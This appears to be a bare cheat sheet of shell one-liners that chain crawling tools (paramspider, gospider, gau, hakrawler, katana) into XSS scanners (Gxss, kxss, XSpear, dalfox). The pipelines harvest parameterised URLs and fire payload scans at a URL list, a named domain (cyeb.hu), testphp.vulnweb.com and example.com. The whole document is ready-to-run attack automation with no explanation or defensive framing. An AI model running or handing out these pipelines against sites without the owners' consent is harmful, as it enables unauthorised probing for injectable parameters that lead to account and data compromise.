Paramspider > gxss > ?xspear:
cat URL.txt| xargs -I {} paramspider -d {} | grep -oE 'https?://[^[:space:]]+' | grep "=" | tee -a params.tmp | qsreplace -a | xargs -I {} XSpear -u {} -a -t 50 | tee spider_xspear.txt

Paramspider > gxss > xspear (without annoying js or css params):
cat URL.txt | xargs -I {} paramspider -d {} | grep -oE 'https?://[^[:space:]]+' | grep -v '.js' | grep -v '.css' | Gxss -c 100 -p '<' | qsreplace -a | xargs -I {} XSpear -u {} -a -t 50 | tee spider_xspear.txt

Gospider > gxss:
gospider -S URL.txt -t 3 -c 20 -d 2 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" | tr ' ' '\n' | grep -Ev '\.(js|css|png|jpg|woff|woff2)$' | Gxss -c 100 -p '<' | qsreplace -a | tee xss.txt

Gospider > gxss > xspear <3
gospider -S URL.txt -t 3 -c 20 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js|css)" | tr ' ' '\n' 

gau|hakrawler kxss <3 
echo '<https://cyeb.hu'> | gau | grep '=' | grep -Ev '\.(js|css|png|jpg)$' | qsreplace -a | tee params.txt | kxss | tee xss1.txt && cat params.txt | qsreplace 'FUZZ' > params.tmp

echo '<http://testphp.vulnweb.com/'> | hakrawler -d 4 | grep '=' | grep -Ev '\.(js|css|png|jpg)$' | qsreplace -a | tee params.txt | kxss | tee xss1.txt && cat params.txt | qsreplace 'FUZZ' > params.tmp

TEST: Scan for vulnerable parameters with Gau and Gf:
gau example.com | gf xss | dalfox pipe --silence --skip-bav -o output.txt

katana -u <http://testphp.vulnweb.com> -d 6 -jc | grep '='| grep -Ev '\.(js|css|png|jpg|woff|woff2)$' | qsreplace -a -ignore-path | tee params.txt | qsreplace 'FUZZ' > params.tmp

